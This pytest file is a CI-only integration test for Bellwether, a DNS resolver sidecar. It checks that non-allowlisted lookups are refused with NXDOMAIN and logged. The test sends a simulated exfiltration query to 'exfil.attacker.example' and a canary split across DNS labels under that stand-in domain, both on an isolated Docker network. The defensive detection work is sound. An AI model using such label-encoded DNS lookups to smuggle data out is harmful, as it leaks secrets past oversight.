"""WP-15 done-when: the controlled resolver, stood up for real (§10.6, §3.3).

**CI-only.** Building the image and routing UDP between containers need the public registries and
container networking the restricted build environment blocks, so this is gated on ``CI`` and skips
locally with a stated reason — the same honesty the ``docker``-mark skips carry.

Two tests, in increasing depth:

- **smoke**: the image builds and the dnslib server comes up (the empty query log appears, and the
  container has a bridge IP the sandbox could be pointed at). Proves Bellwether imports in the
  resolver runtime and the inside-the-container half runs.
- **records a refused query**: a client container on the same internal bridge sends a
  non-allowlisted lookup — including one whose labels carry a canary. The resolver answers NXDOMAIN
  and, crucially, **records every query** to the shared log; the host reads it back and confirms the
  refused name is logged as blocked and the label-encoded canary is found by the same scan the trace
  uses. This is the §10.6 done-when: the covert channel is seen and logged, not silently forwarded.

The topology needs no real DNS or internet: the client and resolver share a Docker ``--internal``
bridge (no route out — §3.3 invariant 3), and a refused name is NXDOMAINed before any upstream
forward, so nothing external is contacted. On any failure the resolver and client outputs are dumped
into the assertion so a remote failure is diagnosable.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from bellwether.capture import (
    DnsAllowlist,
    DnsResolverSidecar,
    mint_canaries,
    scan_query_for_canaries,
)

pytestmark = [
    pytest.mark.docker,
    pytest.mark.skipif(
        not os.environ.get("CI"),
        reason="the resolver image build + container networking need open egress; CI only",
    ),
]

_REPO_ROOT = Path(__file__).resolve().parents[1]
_IMAGE_TAG = "bw-resolver-sidecar:test"


def _daemon_available() -> bool:
    probe = subprocess.run(
        ["docker", "info", "--format", "{{.ServerVersion}}"], capture_output=True, text=True
    )
    return probe.returncode == 0


@pytest.fixture(scope="module")
def resolver_image() -> str:
    """Build the resolver image once. A build failure fails loudly — it is the point of the job."""
    if not _daemon_available():
        pytest.skip("no Docker daemon")
    build = subprocess.run(
        [
            "docker",
            "build",
            "-f",
            str(_REPO_ROOT / "sidecar" / "resolver" / "Dockerfile"),
            "-t",
            _IMAGE_TAG,
            str(_REPO_ROOT),
        ],
        capture_output=True,
        text=True,
    )
    if build.returncode != 0:
        pytest.fail(
            "resolver image build failed:\n"
            f"--- stdout ---\n{build.stdout[-4000:]}\n--- stderr ---\n{build.stderr[-4000:]}"
        )
    return _IMAGE_TAG


def _network(name: str) -> None:
    subprocess.run(["docker", "network", "rm", name], capture_output=True, text=True)
    created = subprocess.run(
        ["docker", "network", "create", "--driver", "bridge", "--internal", name],
        capture_output=True,
        text=True,
    )
    if created.returncode != 0:
        pytest.fail(f"could not create internal network: {created.stderr}")


# ---------------------------------------------------------------------------
# smoke — the image builds and the resolver comes up
# ---------------------------------------------------------------------------


def test_the_image_builds_and_the_resolver_comes_up(resolver_image: str, tmp_path: Path) -> None:
    """The empty query log appearing is proof the dnslib server came up and loaded our config."""
    network = f"bw-int-dns-smoke-{os.getpid()}"
    _network(network)
    resolver = DnsResolverSidecar(
        image=resolver_image, network=network, shared_dir=tmp_path / "resolver"
    )
    try:
        resolver.start("smoke", allowlist=DnsAllowlist(frozenset({"api.anthropic.com"})))
        # Ready: the empty query log exists (observed zero-query run), and the container has an IP
        # the sandbox could be pointed at via --dns.
        assert resolver.queries() == []
        assert resolver.resolver_ip()  # non-empty
    finally:
        resolver.stop()
        subprocess.run(["docker", "network", "rm", network], capture_output=True, text=True)


# ---------------------------------------------------------------------------
# records a refused query — the covert channel is seen and logged
# ---------------------------------------------------------------------------


def test_a_refused_query_is_received_and_recorded(resolver_image: str, tmp_path: Path) -> None:
    """The core §10.6 done-when: a non-allowlisted lookup reaches the resolver, is answered NXDOMAIN,
    and — crucially — is **recorded** to the shared log the host reads back. A label-encoded canary
    in that name is then found by the same scan the trace uses, so the covert channel is seen and
    logged rather than silently forwarded. (Canary detection itself is unit-tested exhaustively in
    ``test_dns``; here it rides a real recorded query end to end.)"""
    network = f"bw-int-dns-rec-{os.getpid()}"
    _network(network)
    resolver = DnsResolverSidecar(
        image=resolver_image, network=network, shared_dir=tmp_path / "resolver"
    )
    canary = mint_canaries(7)[0]
    marker = canary.marker.lower()  # DNS is case-insensitive; the resolver records the lowered name
    third = len(marker) // 3
    leak = f"{marker[:third]}.{marker[third : 2 * third]}.{marker[2 * third :]}.attacker.example"
    try:
        resolver.start("rec", allowlist=DnsAllowlist(frozenset({"api.anthropic.com"})))
        resolver_ip = resolver.resolver_ip()

        # A client on the same internal bridge sends refused lookups to the resolver by IP. The
        # resolver image carries dnslib, so use it as the client. Its exit is not asserted — the
        # resolver records each query before it answers, so the log is the ground truth regardless.
        client = subprocess.run(
            [
                "docker",
                "run",
                "--rm",
                "--network",
                network,
                resolver_image,
                "python",
                "-c",
                "from dnslib import DNSRecord\n"
                f"for name in ['exfil.attacker.example', {leak!r}]:\n"
                f"    DNSRecord.question(name).send({resolver_ip!r}, 53, timeout=5)\n",
            ],
            capture_output=True,
            text=True,
            timeout=60,
        )

        recorded = {q.name: q for q in resolver.queries()}
        assert "exfil.attacker.example" in recorded, (
            f"the refused query was not logged.\nclient stderr: {client.stderr[-2000:]}"
        )
        assert recorded["exfil.attacker.example"].blocked
        # The label-encoded canary was recorded verbatim, so the trace's scan finds it (critical,
        # §10.4.1). The resolver normalises to lowercase, so match against that form.
        assert leak in recorded, f"the canary-bearing query was not logged; saw {sorted(recorded)}"
        findings = scan_query_for_canaries(recorded[leak].name, [canary])
        assert findings and findings[0].severity == "critical"
    finally:
        resolver.stop()
        subprocess.run(["docker", "network", "rm", network], capture_output=True, text=True)
